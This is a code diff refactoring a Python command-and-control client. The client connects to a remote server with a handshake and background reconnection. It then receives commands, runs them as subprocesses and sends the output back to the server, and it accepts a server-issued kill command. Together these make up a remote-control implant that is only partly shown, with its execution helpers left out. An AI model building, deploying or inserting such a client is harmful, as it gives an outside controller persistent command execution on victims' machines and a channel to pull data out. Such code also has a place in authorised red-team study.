@@ -3,14 +3,8 @@ import logging
 import time
 import uuid
 import argparse
-from typing import Optional
-from models.message import Message
-from models.send_receive_msgs import send_message, receive_message
-from models.message_type import MessageType
 from models.command_type import CommandType
-from models.key_manager import KeyManager
-from models.encryption_manager import EncryptionManager
-from models.tls_helper import TLSSessionHelper
+from models.communication_manager import CommunicationManager
 import helper.subprocess as subprocess_helper
 import helper.auth as auth_helper
 import helper.helper_funcs as helper_funcs
@@ -34,126 +28,88 @@ class C2Client:
         self.server_host = server_host
         self.server_port = server_port
         self.client_id = client_id
-        self.key_manager = KeyManager()
-        self._encryption_manager = None
         self.connection_manager = ConnectionManager(server_host, server_port, client_id)
-        self.running = True
-        self.command_queue = asyncio.Queue()
-        self.talking_queue = asyncio.Queue()
+        self.communication_manager = None
+        self._communication_ready = asyncio.Event()
         self._executor_task = None
         self.execution_process = None
+        self.is_alive = True
 
-    async def _send_register_message(self) -> bool:
-        """
-        Send registration message to server
-        """
-        msg = Message.as_register(self.client_id, self.key_manager.serialized_public_key)
-        return await send_message(
-            self.writer,
-            msg.to_payload(True)
-        )
 
-    async def _receive_ack_message(self) -> Message:
-        msg = await receive_message(self.reader)
-        if not msg:
-            logger.error("No acknowledgment received")
-            return None
-        msg = Message.from_payload(msg)
-        if not msg:
-            logger.error("Failed to parse acknowledgment message")
-            return None
-        if msg.type is not MessageType.ACK:
-            logger.error(f"Unexpected message type: {msg.type}")
-            return None
-        return msg
-    
-    async def _set_encryption(self) -> bool:
-        """Setup encryption with server's public key"""
-        if not await self._send_register_message():
-            logger.error("Failed to register client")
-            return False
-        ack_msg = await self._receive_ack_message()
-        if not ack_msg:
-            logger.error("Failed to receive acknowledgment from server")
-            return False
-        session_key = self.key_manager.compute_session_key(ack_msg.command)
-        self._encryption_manager = EncryptionManager(session_key)
-        logger.info(f"Registered as {ack_msg.client_id}")
-        return True
 
     async def _lifecycle(self):
         """
-        Main client loop
+        Main client loop - handles communication lifecycle
         """
-        listener = asyncio.create_task(self._listener(), name='listener')
-        talker = asyncio.create_task(self._talker(), name='talker')
-
+        self.communication_manager = CommunicationManager(self.connection_manager)
+        
         try:
-            await listener # Wait for listener to detect disconnect
-        except asyncio.CancelledError:
-            logger.info("Lifecycle detected cancellation")
-            self.running = False
-        except asyncio.IncompleteReadError:
-            logger.info("Lifecycle detected server closed connection")
-        except Exception as e:
-            logger.error(f"Lifecycle detected an error: {e}")
-        finally:
-            # Connection is dead - clean up
-            await helper_funcs.cancel_task(talker, related_queue=self.talking_queue)
+            # Wait for initial connection
+            await self.connection_manager.wait_connected()
             
-    async def _listener(self):
-        """
-        Listen for incoming commands from server
-        """
-        try:
-            while self.running:
-                encrypted_message = await receive_message(self.reader)
-                if not encrypted_message:
-                    logger.warning(f"Received an empty message")
-                    break
-                    
-                msg = self._encryption_manager.decrypt(encrypted_message)
-                if not msg:
-                    logger.warning(f"Failed to decrypt message")
+            while self.is_alive:
+                # Wait for connection to be ready
+                await self.connection_manager.wait_connected()
+                
+                if not self.is_alive:
                     break
                 
-                if msg.type is not MessageType.COMMAND:
-                    logger.warning(f"Unknown message type: {msg.type}")
+                # Authenticate and handshake
+                if not auth_helper.validate_server_certificate(self.connection_manager.writer):
+                    self.is_alive = False
+                    raise ConnectionError("Server certificate is not valid")
+                
+                if not await self.communication_manager.perform_handshake(self.client_id):
+                    logger.error("Handshake failed, will retry")
+                    await asyncio.sleep(1)
                     continue
-
-                logger.info(f"Received command: {msg.command}, id: {msg.cmd_id}")
-                if msg.command == CommandType.KILL.value:  # TODO
-                    await self._handle_received_kill_command()
-                await self._enqueue_command(msg)  # Queue command for execution
-            else:
-                logger.info("listener exiting | client not running")
-        
+                
+                # Signal executor that communication is ready
+                self._communication_ready.set()
+                
+                # Start communication
+                await self.communication_manager.start_communication()
+                
+                # Communication dropped, clear ready flag
+                self._communication_ready.clear()
+                
         except asyncio.CancelledError:
-            logger.info('listener cancelled')
-            raise
-        except asyncio.IncompleteReadError:
-            if self.running:
-                logger.info("Server closed connection")
-                raise
+            logger.info("Lifecycle cancelled")
+        except ConnectionError as e:
+            logger.error(f"Lifecycle connection error: {e}")
         except Exception as e:
-            logger.error(f"Command listener error: {e}")
-            raise
+            logger.error(f"Lifecycle error: {e}")
         finally:
-            logger.info("Listener finished")
+            self._communication_ready.clear()
+            if self.communication_manager:
+                self.communication_manager.stop()
+            
+
 
     async def _executor(self):
         """
         Execute commands from queue
         """
         try:
-            while self.running:
-                command_data = await self._dequeue_command()
-                if command_data is None:
+            while self.is_alive:
+                # Wait for communication to be ready
+                await self._communication_ready.wait()
+                
+                if not self.is_alive:
                     break
-                result_data = await self._process_command(command_data)
-                await self._enqueue_result(result_data)
+                
+                command_data = await self.communication_manager.receive_command()
+                if command_data is None:
+                    continue
+                    
+                cmd_id, result, exec_time_ms = await self._process_command(command_data)
+                
+                if not self.is_alive:
+                    break
+                    
+                await self.communication_manager.send_result(cmd_id, result, exec_time_ms)
             else:
-                logger.info("Executor exiting | client not running")
+                logger.info("Executor exiting | client not alive")
             
         except asyncio.CancelledError:
             logger.info('Executor cancelled')
@@ -164,90 +120,31 @@ class C2Client:
         finally:
             logger.info("Executor finished")
 
-    async def _talker(self):
-        try:
-            while self.running:
-                result_data = await self._dequeue_result()
-                await self._send_result(result_data) # Send result back to server
-            else:
-                logger.info("talker exiting | client not running")
-        except asyncio.CancelledError:
-            logger.info("talker cancelled")
-            raise
-        except Exception as e:
-            await self.talking_queue.put(result_data)  # Re-queue unsent data
-            logger.error(f"Talker error: {e}")
-            raise
-        finally:
-            logger.info("Talker finished")
 
-    async def _send_result(self, result_data: tuple[str, str, str]) -> bool:
-        command_id, result, execution_time_ms = result_data
-        msg = Message.as_result(command_id, result, execution_time_ms)
-        msg = self._encryption_manager.encrypt(msg)
-        if await send_message(
-            self.writer,
-            msg
-        ):
-            logger.info(f"[cmd id: {command_id}] Result sent ({execution_time_ms:.1f}ms)")
-            return True
-        logger.info(f"[cmd id: {command_id}] Failed to send result")
-        return False
 
-    async def _handle_received_kill_command(self) -> None:
-        await self._terminate_execution_process()
-        logger.info('Draining command queue')
-        helper_funcs.drain_queue(self.command_queue)
-        logger.info('Draining talking queue')
-        helper_funcs.drain_queue(self.talking_queue)
-        self.running = False
 
-    async def _enqueue_command(self, message: Message) -> None:
-        await self.command_queue.put({
-            "cmd_id": message.cmd_id,
-            "command": message.command
-        })
 
-    async def _dequeue_command(self) -> tuple[str, str]:
-        """
-        Fetch command from queue
-        """
-        command_data: dict = await self.command_queue.get()
-        if command_data is None:
-            logger.info("Received None from queue")
-            return None
-        command_id: str = command_data.get("cmd_id")
-        command: str = command_data.get("command", "").lower()
-        logger.info(f"Processing command: {command}")
-        return command_id, command
 
-    async def _enqueue_result(self, result_data: tuple[str, str, str]) -> None:
-        command_id, result, exec_time_ms = result_data
-        await self.talking_queue.put({
-            "cmd_id": command_id,
-            "result": result,
-            "exec_time_ms": exec_time_ms
-        })
 
-    async def _dequeue_result(self) -> tuple[str, str, str]:
-        """
-        Fetch result from queue
-        """
-        result_data: dict = await self.talking_queue.get()
-        if result_data is None:
-            return None, None, None
-        command_id: str = result_data.get("cmd_id", "?")
-        result: str = result_data.get("result", "?")
-        exec_time_ms: str = result_data.get("exec_time_ms", "?")
-        return command_id, result, exec_time_ms
 
-    async def _process_command(self, command_data: tuple[str, str]) -> tuple[str, float]:
+
+
+
+
+
+
+
+    async def _process_command(self, command_data: tuple[str, str]) -> tuple[str, str, float]:
         cmd_id, command = command_data
         start_time = time.monotonic()
-        if command == CommandType.KILL.value:  # TODO
+        
+        if command == CommandType.KILL.value:
             result = "Client killed by server"
+            await self._terminate_execution_process()
+            self.is_alive = False
         else:
-            result = await self._execute_command(cmd_id, command)  # Run asynchronously with subprocess
+            result = await self._execute_command(cmd_id, command)
+            
         exec_time_ms = (time.monotonic() - start_time) * 1000
         logger.info(f"Executed: {command} ({exec_time_ms:.1f}ms)")
         return cmd_id, result, exec_time_ms
@@ -266,15 +163,15 @@ class C2Client:
             await self._terminate_execution_process()
             raise            
         except Exception as e:
-            logger.info(f"Command execution error: {str(e)}")
-            raise
+            logger.error(f"Command execution error: {str(e)}")
+            return f"Error: {str(e)}"
 
     async def _terminate_execution_process(self):
         """Terminate execution process if it exists"""
         if not self.execution_process:
             return
+        pid = self.execution_process.pid
         try:
-            pid = self.execution_process.pid
             await subprocess_helper.terminate_subprocess_gracefully(self.execution_process)
             self.execution_process = None
             logger.info(f"Terminated execution process gracefully (pid: {pid})")
@@ -292,46 +189,28 @@ class C2Client:
             except Exception as e:
                 logger.error(f"Error forcefully terminating process: {e}")
 
-    @property
-    def writer(self):
-        return self.connection_manager.writer
 
-    @property
-    def reader(self):
-        return self.connection_manager.reader
 
-    async def _terminate(self):
-        await helper_funcs.cancel_task(self._executor_task)
-        await self._terminate_execution_process()
-        await self.connection_manager.close()
 
-    async def _authenticate_and_secure(self) -> None:
-        """Authenticate server and setup encryption"""
-        if not auth_helper.validate_server_certificate(self.writer):
-            self.running = False  # no point in endless connection loops
-            raise ConnectionError("Server certificate is not valid")
-        if not await self._set_encryption():
-            raise ConnectionError("Failed to set encryption")
 
     async def start(self):
         """Start the C2 client"""
         logger.info(f"Starting C2 client (ID: {self.client_id})")
         try:
+            # Start connection manager with background reconnection
+            await self.connection_manager.start()
+            
+            # Start executor and lifecycle
             self._executor_task = asyncio.create_task(self._executor(), name='executor')
-            while self.running:
-                await self.connection_manager.reconnection_loop()
-                await self._authenticate_and_secure()
-                await self._lifecycle()
-            else:
-                logger.info("Client exiting | client not running")
+            await self._lifecycle()
         except asyncio.CancelledError:
             logger.info("Client start cancelled")
-        except ConnectionError as e:
-            logger.error(f"Client start connection error: {e}")
         except Exception as e:
             logger.error(f"Client start error: {e}")
         finally:
-            await self._terminate()
+            await helper_funcs.cancel_task(self._executor_task)
+            await self._terminate_execution_process()
+            await self.connection_manager.close()
             logger.info("C2 Client stopped")
 
 # ==================== MAIN ====================
@@ -353,7 +232,7 @@ async def main():
         await client.start()
     except KeyboardInterrupt:
         logger.info("Client shutdown")
-        client.running = False
+        client.is_alive = False
 
 if __name__ == "__main__":
     asyncio.run(main())
